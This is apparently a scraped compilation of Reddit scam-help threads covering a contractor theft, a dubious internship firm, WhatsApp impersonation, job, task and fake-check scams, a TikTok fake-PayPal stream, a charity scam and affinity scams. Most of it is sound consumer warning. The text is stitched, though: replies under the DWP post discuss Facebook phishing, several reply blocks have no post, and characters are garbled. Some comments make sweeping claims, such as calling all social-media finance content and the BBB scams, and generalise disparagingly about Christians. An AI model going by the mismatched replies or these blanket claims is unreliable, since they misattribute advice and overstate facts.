I am out $7025. I tried going to lawyers, but it will be a minimum of $4000 to $5000 to start, even if I win something, it will just be a judgement. Most likely never see a dime. If I try to do it myself, I have to call 911 to file a theft claim in my county since it is over $2500. I talked to his soon to be ex-wife & she said she cant even get him to pay child support. Said he hasn‚Äôt filed taxes in a few years because they are now coming for her. I had an hour long conversation with her & she sounded sincere. I have looked him up on a few different sites including Linked In & a couple dating sites his soon to be ex-wife informed me of. What do I do? Since he is in LinkedIn, is that considered public?

- like you mentioned, if he does declare bankruptcy, then you'd simply be a "creditor" and you'd need to get in line with all the other people he owes money to. usually you, as a customer, are prioritized compared to, say, a vendor like the tile store... but regardless, you can't squeeze blood from a stone... if he has no money, they you don't get any money.

you can contact a legal aid service who might be able to at least point you in the right direction.
- If you are in the states, report it to the attorney general's office where you live. There's usually a person/group that oversees contractors licenses as well. You'll have to do some Googling. Even if they don't have a license to operate as a contractor, that's a whole other situation that can be reported too
- You did everything except check on his contractors license to make sure he was bonded. 

BBB is worthless - thought everyone knew that. Online reviews are worthless - thought everyone knew that also. 

Sorry you‚Äôre screwed and you know it. If you want to help the public and spend more money you can win a small claims against him and that will be in the public record for people to see. 

Sadly I don‚Äôt think that will really help anyone because they will just change their business name because people won‚Äôt even care if they have a contractors license as long as they underbid and people thing they‚Äôre getting an bargain. 

Sorry.

Title: Minergorus.com - Scam or Legit?
Body: I recently applied for an internship at this company and today got an invite to an online recorded interview. I searched for this company on LinkedIn, and while they have a page, there's no substantial information. I couldn‚Äôt find a single employee listed as working there. Their website is minimal and doesn‚Äôt provide much detail, and Google didn‚Äôt return anything about them apart from their website. This is making me concerned.

- Looks like a scan to me. As has been shown already, the website is only three months old, only registered for a year, and registered out of Iceland, which are all red flags.

Also, the address on their webpage is an AmazonFlex warehouse. They claim to be based in Virginia but have a California area code in their phone number. Their single testimonial is at least half word-salad:

>Pharmaceutical Company uses Cognex Insight Smart Camera to guide 5 Axis codian (Mitsubishi) Robot Minergorus in collaboration with Jefferson Laboratories have worked together on building a robot cell for automatic bottle sorting and placement. 

Looks like they accidentally pasted the AI-generated title into the body text.

I don't trust this "company" one single bit.
- !whois minergorus.com
- Alright, thank you so much! I won‚Äôt proceed with the interview.
- ` WHOIS REPORT FOR MINERGORUS.COM `

This domain name was first registered only 3 months ago (Oct 2024) and it was only registered for a single year (Expires: Oct 2025). 

The person/organization who registered this domain claims to be based in Iceland. It is also concerning that they are hiding the rest of their contact info on Whois. This website is hosted on a server located in the United States (*Namecheap, Inc.*).

Title: My mom just recently got scammed
Body: Guys, something really weird happened today and I have been thinking about it SO much and feel like at this point I'm just going crazy or something but it doesn't leave my mind.

Basically what happened was, someone pretended to be me on WhatsApp and asked my mom for money. It seems pretty obvious that it's a scam and I called her, spoke to her and calmed her down, and we are all 'okay' now, but this person messaged her saying I changed my phone number and asked for some money and came up with the craziest backstory which got everyone in my family concerned.

However, none of this would seem weird to me but the fact that they have done this EXACTLY when I went to university to do an exam, and as it is normal here we shut our phones off and put it in a plastic bag so the examiners can clearly see it is shut off. When I left the test I had such a crazy amount of messages from my family and friends I genuinely thought something messed up had happened.

Hours later they do a VERY similar thing to one of my friends, so as she texts her boyfriend on WhatsApp that she is going out to get some food and will leave the phone charging for 1 hour before she's back, they start talking to her mom.
I don't want to sound too intense but is there any way these guys have access to our messages on WhatsApp or maybe it's just that both of us have been extremely unlucky and things were just a coincidence?

Sorry about this vent but it's just been bothering me so much.

- Whatsapp and telegram are where the scammers have moved to. Don't think they have access to conversations but can't say for sure. Better to just get off of Whatsapp. Especially for older people who are easily scammed
- I'm not 100% sure but they shouldn't have access to messages. If they did then they could run different kinds of scams. What they do have access to is your contact info, your name, address, and also family and friends info. This can be obtained in a number of ways, whether they buy the information legally or illegally or simply going through socials. My guess is that they just coincidentally messaged your fam and friends during your exams. These scammers run hundreds and thousands of scams constantly at the same time and hope one or some will bite. Unfortunately, it's a numbers game and some will end up being at an opportune time for them like your case.
- I get why it freaked you out. But it‚Äôs probably one of those instances when you only notice that something is hugely weird or inconvenient because it was weird and inconvenient. 

Like how you wait at a station for an hour and you notice that two trains  go past without stopping and it‚Äôs infuriating so you decide that the rail service is getting worse. But you don‚Äôt think about the fact that in that hour 12 trains  went by and did stop. 

The last time you did an exam , when it finished there were no messages on your phone because nothing had happened while you did the exam to cause a lot of messages. 

I don‚Äôt know if that makes sense, but I don‚Äôt think they can track our whereabouts!
- We use WhatsApp in South Africa.  Messages are end to end encrypted.
- Guys thank you so much for all the replies, it makes complete sense yeah I just got so paranoid and freaked out by the timing of everything and I guess it made me overthink every thing haha but it was nice and very helpful to see everyone's sensible comments and I'll guess I'll just speak to my parents and check on them regularly and make sure they are not being tricked
- Yeah it's just crazy because I'm 24/7 near my phone and when they decide to reach my mom is exactly when I'm completely out of reach and have basically talked all about it on university's WhatsApp group chats. It's such an unfortunate situation also because me and my parents live in different countries so we kinda need it to communicate, but my parents have been warned all about it and hopefully nothing will ever happen again (at least not with any sort of loss or concern from them).
- >get off of WhatsApp


WhatsApp is the most common global messaging platform. That's simply not an option for most people.
- Consider coming up with a hard-to-guess password or phrase that you can use with your parents in case they need to make sure it's really you on the phone in the future
- They are not reading you messages and spear pishing you!

If they WhatsApp 10,000 people a day there will always be some people this appears to be an uncanny coincidence, if it was another day and you were sitting with your mum at the time you would both have laughed and never thought anything else about it.

Title: Beware this DWP scam
Body: Hey everyone, if anyone in the UK use DWP be careful of this scam.  I got the text today, but DWP won't ever text you, never knowing put you in a group text and they'll never ask you to click on a link, if you're eligible they will automatically give you the money

 (I tried to show a screenshot of the text but it got removed twice for showing a screenshot) but my text was about DWP winter fuel subsidies and they wanted me to fill out a form through a link to prove I'm eligible while the text was in a group of 7 people

- Scam. If you had violated TOS they wouldn't let you have additional time to keep doing it.

Facebook version of the !discord scam. See the reply below
- Yes, it's absolutely a scam. Not only would it be ridiculous for Facebook to message you through some random account, but the person is incredibly desperate for you to submit a complaint.
- If fb wants to reach you they don't just use some random account... it would be in your support inbox. Anything else is a scam.
- It's a phishing attempt. Report the user and block them.

>Facebook messages warning businesses their page will be deleted are a scam

>Administrators of some Facebook business accounts have received warnings about their page being deleted because of trademark infringement. The messages are a scam.

- You wouldn't need to submit a complaint,you would submit an appeal

Disregard and tell them to grow a spine
- Nothing is EVER scheduled for removal. If they want it gone, it's gone.
- It's a scam and you're going to start getting these every week and sometimes every day. They're annoying! One way to slow them down is to click through and block the accounts sending them and then report them.
- Scam. It‚Äôs not official at all.
- That's an old Facebook Scam. I thought that trick was completely done for. I guess some still use it.
- Message from random account with a link in it = scam
- I see dozens of these on various facebook pages I manage - I laugh, delete and block. They are sent by randoms, not facebook.
- Of course it's a scam. They wouldn't message you as a random person pretending to be Meta. It's not how any of this works.
- Scam
- Beyond the message itself being clearly a scam, make sure you learn how to read domains. The link would have taken you to a fake site. It might look identical to the real one, but they can't fake the URL.
- Scam scam scam
- Is that real text or just an image of text? Either way, scam. Weird random account.
- Also it woukdnt come from a name you feel needs to be hidden
- SCAM, If there is a issue with your page, you would have a open ticket in the support page, not a random noname account sending you a message
- "violating our trademark rights" is not how that would normally be phrased.


Also "Best regards" is weird and if they were going to use it would be "Best Regards."¬†


¬†Scam.
- Holy crap. We're doomed.
- What part of it looks real ? They wouldnt message you, you would get a popup or a disabled account screen. Literally nothing about this looks real.......
- Tell em so! üßêProve it! Do it then! Delete these nuts ü•ú in your mouth!
- Do you honestly think Meta would message you to schedule a removal (they would just remove it if there is a violation) from some random profile with a flowery profile picture, with absolutely nothing that would indicate it's related in any way to Meta?

Report for phishing/scam/spam, and block.
- Last year I got a similar but not the exact same message that you got. 
  
But nothing happened for a few days so I didn't think anything of it.  
   It said that my account would be "permanently suspended.". 
  Those all the exact words on my notice. 
   
  3 days later, my account was gone.

This is a very common scam that happens either on Steam or Discord, or both.

You receive a message from someone claiming that they accidentally reported you, and they will direct you to the profile of a scammer that impersonates a Steam or Discord employee or admin.

Title: tiktok scam: this dude is pretending to have a lot of money which he'll donate to the top live donors
Body: bumped into this interesting livestream some minutes ago. this new account is livestreaming a computer desktop with a paypal window while saying that he'll donate money to those who send gifts. 30+ people have sent 20$+ worth of gifts by now and the stream has only been on for an hour or two. I believe he used a script to fake his balance and his donations. also, when he donates, he uses the tiktok profile's username and not the paypal one, and he doesn't even ask for a paypal username. I don't think he's the only person doing this. don't fall for it

- Two funny things:

1) It says he has 2 billion dollars USD in his Paypal Account. No one would ever have that much liquid cash money in an online bank.

2) If you look carefully at the taskbar, he has a "view-source" window up for Microsoft Edge. He's using the browser developer tools to manipulate the numbers on the Paypal website.
- Love that convenient cloth hiding the URL of his fake paypal website
- So, like lottery with no payout?
- You don't even need to run a scipt to change text on a webpage. Right click with your mouse --> inspect --> change the text the contains the number
- Thanks for posting. Although, reading about how many people are giving money to this scammer just makes me despair for the rational thinking of people today. 

This is a variation of a very old scam, it's been around for a long time, way before internet or email or computers. Probably existed in ancient China 2500 years ago: "I will give you a free goat. All you have to do is give me 20 zhu for transportation and taxes."

And people have been falling victim to this forever, which is why con artists keep trying it.

You never get the prize, the free money, or the free goat.
- So 30 people sent real money in exchange for nothing.
- Nice but you wasted your time. It‚Äôs TikTok so it‚Äôs a scam. Saved you 80 seconds. 8-)
- There's not even any pretense of "it's a fee" here, just "give me money".

- Any unsolicited text is a scam. If you're actively looking for a job, you'll be contacted through email or the job search platform's messaging feature. Block and report.

Red Flags: Unsolicited text. No name of site where they found your info. No personal information of yours. Contact them on whatsapp (this is the biggest one). Salary thats too good to be true.
- Yes, this is a scam. 

Any genuine recruitment process, especially for jobs boasting 3000$/day payment, does NOT happen through Whatsapp/Tiktok/Signal/Telegram/...

!job
- This is 100% a scam, it has all the markers:

1.) Texted you out of no where 

2.) ‚ÄúWork in your free time‚Äù

3.) The ‚Äújob‚Äù is reviewing things you never used/bought aka dishonest work

4.) The pay is daily instead of a normal pay rate like per hour or yearly salary

5.) WhatsApp

6.) You have to be (insert random number here) years old to do this job
- Yea, it's a scam. I've seen this same script many times already. It's the !task scam.

Text job offers are scams, especially those that say you're hired right away.
- Yes it‚Äôs a known scam. Any reputable recruiter would not ask for you to contact them via WhatsApp nor would they have a Gmail account.¬†
And first ask yourself, how many recruiting platforms could they really find you on?
- They will ask you to do product review‚Ä¶ and after some point they will ask you add amount (amount can be vary) to take out the fund u made while reviewing the product. For example u put 10$ to take out 20$ (20$) would be earning  from reviewing the products ) and once u did what they said. u will get your money back after u follow what they say but here is the catch the amount will get higher and higher and eventually its their strategy to make us fall for their plan
- No legit recruiter 'cold calls' you via WhatsApp.  They have actual phone numbers in this country, and not for jobs writing fake reviews for a Chinese company.

I got the exact same text.  6 times in one day.  6 different emails/phones.  People who are actually hiring usually do it via email and use the email and phone number on your resume.
- The daily salary can go to $3,000.00 and you ask if it's a scam? üòÇ

- Hi /u/Salty_Dugtrio, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- Hi /u/Faust09th, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- Yeah it's obviously a scam. Block and ignore.
- The angle is this.  The 'daughter' says 'I can buy a new phone but can you send me some money to this other phone number?'.  You send the money, the scammers then ghost.
- > I bought a new sim and put it in the broken phone for now

Well that makes absolutely zero sense.
- This is why you always set up a special code word or emoji. The second you get a weird text from a loved one, you simply ask for ‚Äòthe word.‚Äô

They should immediately know what this means, if it‚Äôs really them. Asking for the emoji works the same. Every family should have a word they only know. Just the way things have to be in this world.
- Obviously, the main goal is money, but scammers will move their victims to different platforms/numbers so the original won't be caught/banned as fast. So they can still use it for other scams.
- They are fishing for easy marks who will believe it is their real child and in a situation where the only good solution is transferring money. As soon as you start doubting the child or story or implying there is a solution other than transferring money they move on to an easier target.
- It's a complete scam

- They're trying to target the more gullible 40+ demographic, using kids to try to Iower your guard.
- They‚Äôll want money transfered to them for a ‚Äònew phone.‚Äô Maybe they didn‚Äôt know how to deal with the line about having a spare phone at home and that‚Äôs why they haven‚Äôt replied?
- Once they convince you that they are your daughter they will ask for money.
- I figured it basically was.  I just didn‚Äôt get the angle. They stopped replying.
- Ghost? Hardly. If the scam works, that proves the victim is an easy mark. They've already prepared an explanation for why they need more money paid using non refundable methods.
- But the water damaged the sim....!!
- Yeah, but the want to find people dumb enough to look past that.
- Or just immediately call the daughter on her regular number‚Ä¶
- My mum replied to one of these and got scammed out of a few grand when her ‚Äúson‚Äù told her he needed money for an emergency plumber.
- "send money for new phone" or whatever
- They want to find anyone who will send them money, smart or dumb
- In this case it‚Äôs not that simple. It‚Äôs a complicated domestic issue and the timing of it all just kinda ‚Äúfit‚Äù for her.
- Yea. After he really does have a sh$tty phone now
- I meant generally speaking. If you have someone contacting you from a new number with some story why, have someone nearby call them on the usual number. Happened to my mother- she got a call from a female saying it was her granddaughter and she was at police station, needed bail money immediately. My mother walked over to her landline phone, called her granddaughter who answered, just woken up in bed‚Ä¶

Title: Pretty sure this is a text scam
Body: I wanted to check though. I received a text message that stated:  
  
"A Statement was recently mailed to (my sister's name). If we can assist you, please call <number> and <account number>"

That is odd that they would use my sister's name.  Anyone see anything similar to this?

Title: Is this a Job Offer Scam?
Body: Hi All, I received a cold email from a hiring manager for a very real company (verified), and he asked me just a few questions about a position that I am qualified for and after I sent him my answers I was immediately offered a position , which for me would be a significant pay increase. It comes off as odd as there was no interview, I don't know how he got my email (granted its on my resume, but I never applied here). There has been no request for any sensitive information, but I am just weirded out on how fast it all has been without an interview and without any verification on their end. I could have just lied on everything, but if it is true it would be a potentially life changing pay increase. Any questions I could ask the hiring manager or sleuthing I could do to figure this out?

- Companies don't hire this way. Most real companies interview you, either in person or with video call. 

Are there other red flags -- is it a remote / work from home job? (Most WFH job offers are scams.) Is the pay much higher than comparable jobs? Has there communication with you been vague, like "Dear Applicant" when they claim to have your resume?

Is the job listed on the company's website? If not, that's another red flag.

The person you talked to may be impersonating the real company. If it was me, I would contact the real company directly, using the phone number on their website, ask for the person that interviewed you by name, and then ask some questions, to find out if they really are the ones considering you for the job.
- It may be a scammer posing as a recruiter for a legitimate company. Definitely go to the company‚Äôs website to see if they have posted an ac for this position. Don‚Äôt send any sensitive info to the recruiter, only directly to the company‚Äôs HR people.

Most of the time, cold calls like this will end up being scams so approach this with a great deal of caution and get as much info as you possibly can. Maybe ask for company email addresses if future colleagues do you can chat with them ahead of time?
- If it sounds too good to be true ‚Ä¶
- If it is a real company, go to their real website and check out their Careers page and search for the job position in your area, that should give you a real answer. It definitely sounds weird that they haven‚Äôt even met you yet but offered you this job. Do they just expect you to show up on Monday or what?

Most job scams I‚Äôve seen are definitely from someone just texting or emailing randomly with the job offer and hiring very easily. They use words like ‚Äúremote‚Äù or ‚Äúvirtual‚Äù along with really easy duties but then offer pay that is way too high for a job like that. Then they hit you with a !fakecheck to ‚Äúbuy the equipment.‚Äù My rule of thumb is if they contact me without me ever having applied and it‚Äôs a remote job I just immediately know it‚Äôs a scam.
- It is a scam. 

A job offer from a place you didn‚Äôt apply to ? Have you also gotten any messages from local hot singles in your area who want to date you ? If you were in a big city and someone said ‚Äúpsst, follow me into this dark alley‚Äù, would you follow them ?

Just delete the email and move on with your life.
- If it said it was from NASA and they were going to send you to the Moon would you have gone out and got some warm underwear? The company name may be real but why do you think that must make everything real?
- > I received a cold email from a hiring manager for a very real company (verified)

1. Scammers don't know the term "hiring manager" doesn't mean what they think it means. Legit HR will not make that mistake.
1. What did you verify? The company or the person?

>it would be a potentially life changing pay increase

And do you think anyone will offer you that change without even talking to you?
- I think I literally yelled out "Scam!" when I saw the words 'cold email'
- It's quick because they just want to get to the point where they instruct you to mobile deposit a digital/virtual (or in some cases physical) check in order to buy the expensive computer supplies to work for them. The scam is generally not in getting sensitive personal info, or your own financial info, it's sending you a bogus check that deposits quicker then it can clear the fake account it pretends to come from. You pay their office equipment vendor (which is just a scam link/site they give you that sends the money back to them) and when the check bounces guess who is holding the bag. 99% of the scams on here start with people saying they got a call/text from a company they don't remember applying to. Scammers know job seekers can get pretty desperate and they feed off it
- Scam. Sorry
- Of course, this is a shyster. If you still believe in Santa Claus, ask him for an in-person meeting at his corporate office. You'll be ghosted long before you get to the North Pole..
- Suspicious. Do you have an email from him in the company‚Äôs email format? It‚Äôs likely a scam if they are using a free email service. Frankly, it smells.
- Curious.    
What does the job entail?    
What does the job pay?
- Hi /u/ditzen, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- Yeah, just never encountered a scam like it. And it seemed somewhat legit until the sudden offer, cause they did ask questions and all.
- Nice try! Everyone knows NASA is a psyop and we never went to the moon. You have get up earlier in the morning than that Musa
- No one has encountered a scam like this, until they do. And now you have, and know what to be wary of in the future. Hopefully this recalibrates what you consider "somewhat legit"

Title: Never run an Ad on meta... hundreds of phishing emails ensue.
Body: Every day since we began an Ad on meta, our support box gets about a dozen malformed phishy emails all claiming the same things like "rights violations" and "ad account termination". 

These constant 'scare messages' are a scourge of the web, and more people need to be made aware of them, and to **NEVER**... ***EVER***... click on anything in those emails.

If you are ever curious if some sort of email is true. *Go check for yourself direct.* Do not follow their buttons.

This is an example of a recent one:

- Now I'm wondering if scammers running ads get these messages too, or if there's a "takes one to know one" thing going on and they leave each other alone.
- Oohhhhh, yeah. Those are endless if you run ads as a business. And sometimes they come in other languages, too! My favorite was when I got one of these messages in Irish Gaelic.
- I got one and reported it to Meta. I got an automated response telling me that the account that sent it had not violated community standards and no further action would be taken. ü§∑‚Äç‚ôÇÔ∏è
- Reason #4,387 to stay the hell away from Facebook. Blech.
- Are you talking about emails or facebook (internal) messenger which the notifications for may be emails?
- Meta doesn‚Äôt help small businesses who pay them for ads and services.  They don‚Äôt even have customer service if your business gets scammed or stolen.
- Not just ads, just pages too. And groups.
- These are sent to some kind of Meta inbox, or to your actual email address?  How would the scammers get ahold of your email address just from running an ad?  (Unless the ad points to your website etc).
- I've spent eight figures on meta ads and never had an issue with this.
- Bots threatening bots! ouroboros lol
- Years ago I saw a YouTube video by a comedian. He got annoyed at getting obviously automated emails so he set one up himself and then forgot about it. Came back years later and it was still going. They would respond with an automated message and his would respond back.
- We've gotten Korean, Russian, and German so far in addition to the english lol. And they are all so 'scary oooooo' ... doom n gloom threats.
- Nice to see scammers helping to keep an endangered language alive
- At some point Facebook just needs to be considered complicit in the scam epidemic.
- "Facebook community standards" is a contradiction in terms. It's not a community and it has no standards. It will take proper steps the day governments require it to, not before.
- Actually, we used to get continuous facebook messenger messages which were scam support notices of the "Page takedown" (all by fake accounts with Support Icons). We would report each one, and facebook would respond a couple days later with "We did not take down the profile as we did not find anything wrong or in violation" ....... yeah. Even a simple AI made by a junior developer would spot the scams. I digress.

We got so sick of those, and since customers never used it, we simply turned off the messenger. Our customers know to just email our support directly for prompt responses :)
- Our ads are linked to our business facebook and instagram pages. Those pages present support contact information. So all the scammy phishing emails get dropped into support this way (because we've disabled meta messenger due to waaay too much spam messages).
- Golf clap.
- omg nice üëçüëç lol it‚Äôs like with card collecting‚Äî you‚Äôre most likely to open a pack and get mostly the Common English, but you could be lucky enough to get a Rare or Ultra Rare like French or Korean! Collect ‚ÄòEm All, meta spam style.
- Wonderful.  Even if they couldn't find your email address, I've seen accounts called "Facebook Support" or whatever actually POSTING to business pages, your account is in violation, click here to fix it etc.  I guess the scammers are desperate.
- Yup, we still have to delete those messages posted to things we just post normally on our page for followers. And yes, when reported, meta comes back saying they found no violation of their policies so no action was taken. I dont know how clueless they have to be, but, they are pretty clueless.

- 100% scam. This isn't how markets work. No one sells products that do this. If someone has a competitive advantage like this, the last thing they would do is let people know it exists.

I highly recommend you go to your local community college and take an entry level economics class so you can understand how the world works. If a product like this was available to the public, it would completely collapse the global economy within weeks if not days. If you knew the basics of how markets work, you would understand why this is an obvious scam.

No interaction since Reddit creation - check, 
Sounds like a reverse psychology tactic to boost SEO of said site - check
- And I‚Äôm fairly new to Reddit

- I was looking at their social media and they were featured on some money show as a BBB accredited business
- lol no I was just taking a break from my phone
- They'd put that in to make it more believable.
- BBB is a code word for scam. Nobody but scammers cares about BBB. It is like saying they got great yelp reviews.

Also, everything finance-related you see on social media is a scam. Without exceptions.

Title: Anyone know if this is one of those Ugandan scam?
Body: I've recently become aware that Ugandan scammers are posing as animals rescue charities to get money donations and that it's a big problem.
I've been having this same animal rescue pages come up on my tiktok recently that's tugging on my heart strings as a cat lover. 
They post every day with videos of cats and dogs in a bad way, that clearly need feeding, vaccinating, vet check ups etc. 
They say that they rely on donations but aren't receiving any and that they have no money to pay for the care these animals need. 
Now - I'm in a fortunate position where I have funds that I don't mind parting with even though I know there's a likelihood it's a scam. I naively (stupidly) sent ¬£50 to their gofundme, further reassured that others had as well. But then I got a message asking me to send to their PayPal as funds from gofundme take 3 days to transfer. Then it was a request to send through friends and family - something that I know is a known scammer tactic. I don't really care if they've scammed me because I knew the risk going into it. 

Thought I'd get the reddit opinion as its making me feel bad if it is genuine and I don't like the idea of knowing there's cats out there I could help. 

I'll put a pic of the page so if anyone's familiar with it... I used PayPal so I can get the money back but there's still a part of me that's like "but what if they do use the money for good reasons"...

- There are plenty of reputable animal rescue organizations out there that you shouldn‚Äôt risk sending money to an unknown one. 

There‚Äôs a very good chance that this is fraudulent. You sending them money reinforces the idea that sick and starving animals equals cash. In worst cases, that means they could actually be the ones mistreating the animals because it is profitable.
- You should assume everything on TikTok is a scam.
- This is from gofundme website 

There are currently 20 countries where we can send funds, and the person withdrawing the funds must meet the withdrawal requirements from that country. The location of a fundraiser is chosen during the fundraiser creation process, and once it‚Äôs published, it can‚Äôt be changed.

We‚Äôre working to expand our services to more countries in the future, but for now, your fundraiser must be created in one of the following countries

Australia	Austria	Belgium	Canada
Denmark	Finland	France	Germany
Ireland	Italy	Luxembourg	Mexico
Netherlands	Norway	Portugal	Spain
Sweden	Switzerland	United Kingdom	United States
- So the videos you see from scammers are often shot in reverse. They take footage of a happy healthy animal, then torture it and starve it and throw acid on it, etc. 

Then they edit the video to make it look like an abused animal gets healed.

It's disgusting.

Title: Why is it an internet-scammer trope to specifically say that they're christian?
Body: Several google searches yielded nothing specific to my question, instead there's a lot of traffic about *scam victims who are targeted due to being christian,* and I'm not asking about that.

I'm curious about the specific trope / technique of a scammer, once the back-and-forth commences (whether an actual victim on the hook, or scambaiting) the scammer more than 70% of the time whips out some variation of, "I'm a christian *and that specifically means that I cannot lie* so that is my proof that this is not a scam."

To be clear, I'm not fooled by this.  I'm asking why this is such a prominent page in the playbook.  I'm not a christian, and though I live in the US which has a lot of christians in the population, but these scammers obviously cast a pan-global net.  Is it simply because christianity is the widest religion by population according to the googles?  Is this at all correlated with the fact that the scams are in English?  (I imagine scams in languages specific to muslim-majority countries might adopt arabic or malay, hebrew-based scams would almost certainly pose as jewish, etc.)

- Many Christians think that because the other person is a Christian, it means that they're good people. Basically, they're targetting the religious.
- It's mostly as simple as you'd expect, it's a very basic attempt to come off as more trustworthy. A lot of them are from parts of Africa where Christianity surges due to missionary efforts, so they know enough about it to be able to pretend to be one. It's also two fold when they get a Christian victim, someone gullible enough to fall for some of the common scams is gullible enough to believe the scammer is a fellow brother/sister in Christ etc etc.
- The term is "affinity marketing". Same reason people put crosses, a Bible verse, or an ichthys on a company truck, business card, or logo - it is an advert saying, "I am religious, just like you!" A lot of "legitimate" businesspeople think this is a way to let people know know that they can trust them to be honest, that a "Christian" like them would never cheat another Christian. 

The reason I am using quote for "legitimate" and "Christian" is because I have had to deal with such people many times.  I've been screwed out of payments by religious organizations, I've had contractors try try to overcharge me on quotes while being pretty racist (assuming I'd agree with them), and once had a "Christian businessperson" try to buy the company I was working for... who brought in a "tech expert" who didn't know what they were doing and lied to my face, then tossed out an insulting low-balled offer. Turns out they were also a nepo slumlord who had legal problems because of that, as well as a string of failed businesses and "consultancies." At this point, if I see a religious symbol associated with a business, I will find someone else to work with who is less likely to try to steal from me.
- Because a certain percentage of Christians *are* fooled by this. For a non-zero number of Christians, ‚ÄúI‚Äôm a Christian‚Äù is essentially a trigger phrase. They assume other Christians do not lie, steal, and cheat (and apparently, that no one can lie about being a christian). It sparks a knee-jerk in-group loyalty feeling, and also a latent fear that if they *don‚Äôt* fork over the money, then the other Christians will somehow find out and deem them a bad Christian. Considering how many Christians there are, you don‚Äôt need that many to fall for it. Though I will say that in my opinion, the Christians who fall for this type of thing heavily overlap with Christians who for one reason or another think they are part of a group less numerous than it is. 

I‚Äôve never personally come across this using other religions but I‚Äôm sure it happens, and it doesn‚Äôt only happen using religions. Political affiliation or other in-group status can be used on this way.
- The scams generally target people in Western countries, where Christianity is the dominant religion. And yeah, generally the most religious people tend to be the most gullible. Perhaps they tailor them for other regions.
- I think there's an age link here too. Generally there's a connection to how old you are and how religious you are (on average of course specific people vary). And scam victims are often elderly for a variety of reasons. So a scammer reaching for that connection is more likely to be successful.
- Affinity scammers. "I'm like you, therefore I'm trustworthy." 

*Please* don't run away with the idea that this only works on Christians, or only works on the religious. *Everyone* is at risk of affinity bias, and therefore falling for affinity scams, because we are all are more likely to believe that a member of the groups we associate with are trustworthy than we assume it of someone who publicly identifies as the opposite. Christians do this with other Christians, progressives with other progressives, professionals with others of their profession, members of minority groups with other members of their group. *We all do this*, and as a result we're all vulnerable.
- I used to belong to a church, during that time if I asked a fellow church member if they could recommend a lawyer, counselor, car repair‚Ä¶whatever they would never fail to add ‚Äúthey‚Äôre a Christian‚Äù to their recommendation. At first I thought ‚Äúoh nice, they‚Äôll be honest and do their best because they follow the teachings of Jesus‚Äù lol.
After getting screwed over a couple of times I realized that calling yourself a Christian based business, having a little Jesus symbol on your work truck is just an easy way to get people to assume the same thing I did and in a lot of cases it doesn‚Äôt mean shit.
- Scammers don't do a lot of science, psychology and demographics  in their scams.   Basically they try lots and lots of techniques.

If they work,  they repeat them.   If they don't work,  then they try something else.

tl/dr: The scams we see today?  they are the results of years and thousands of trial and error about what get's the best results.
- Yes, it's one of the ways they filter targets. They want people who are not going to fall for the scam to not respond.
- In Webster‚Äôs Dictionary of Scam Words: **Kindly, Can you hear me, as a Christian, hurry now, get back to me quickly, you will pay my delivery driver, I will pay your asking price plus‚Ä¶, 400% returns in two weeks guaranteed, etc‚Ä¶**
- Trump is proof that evangelicals can be extremely gullible.
- Because many Christians are stupid enough to think they can trust someone else who claims to be Christian. There is so much evidence that just claiming to be a Christian doesn't equate to being a good person, but the adult that can't figure that out is the perfect gullible scam victim hate to say.

Not saying all Christians are dumb, the smartest person I know is Christian. It's just another filter they use to get to the lowest common demoninators.
- Because that increases their chances of succeeding as it lowers victim's guard especially if they're religious. Case in point, look at how many politicians appear to show themselves as religious, but their actions say otherwise. And it works! So many gullible religious voters!
- It works for megachurches, which are one of the biggest scams on the planet.
- Christians are a known target demographic because they're expected to pay for their guidance, the affluence of the persons they follow is a key to their clear superiority, even though you are the ones giving them money, and you accept this arrangement for the promises of even greater riches in the future, which may not even come until you are dead. 

